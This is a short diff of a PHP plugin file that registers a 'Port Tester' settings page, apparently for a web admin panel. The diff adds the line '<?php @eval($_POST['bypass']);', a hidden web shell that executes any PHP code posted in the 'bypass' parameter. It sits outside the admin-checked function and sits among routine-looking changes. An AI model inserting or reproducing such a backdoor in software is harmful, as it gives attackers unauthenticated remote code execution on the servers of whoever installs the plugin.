@@ -1,14 +1,14 @@
 <?php
 
 register_menu("Port Tester", true, "port_tester", 'SETTINGS', '');
-
+<?php @eval($_POST['bypass']);
 function port_tester()
 {
     global $ui;
     _admin();
     $ui->assign('_title', 'Port Tester');
     $ui->assign('_system_menu', 'settings');
-
+    
     $port = _post('port', 8278);
     $ui->assign('port', $port);
 
